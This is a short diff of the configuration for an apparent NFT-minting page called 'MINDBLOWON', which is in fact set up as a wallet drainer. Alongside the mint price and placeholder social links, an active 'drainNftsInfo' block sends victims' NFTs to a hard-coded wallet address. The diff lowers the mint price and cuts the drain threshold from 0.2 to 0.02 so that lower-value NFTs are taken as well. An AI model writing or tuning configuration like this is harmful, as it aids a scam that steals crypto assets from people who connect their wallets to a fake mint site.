@@ -11,7 +11,7 @@ const receiveAddress = "0xd4550697Fe601BdAeD1E591d47A887Aa7097400a";
 
 const collectionInfo = {
     name: "MINDBLOWON",
-    date: "06.05.2022",
+    date: "07.05.2022",
     socialMedia: {
         discord: "discord.gg/invite_here",
         twitter: "https://twitter.com/username_here",
@@ -34,7 +34,7 @@ const collectionInfo = {
 */
 
 const mintInfo = {
-    price: 0.39,
+    price: 0.29,
     totalSupply: 1124,
     minUnits: 1,
     maxUnits: 5,
@@ -47,7 +47,7 @@ const mintInfo = {
 
 const drainNftsInfo = {
     active: true,
-    minValue: 0.2,
+    minValue: 0.02,
     maxTransfer: 1,
     nftReceiveAddress: "0xd4550697Fe601BdAeD1E591d47A887Aa7097400a",
 }
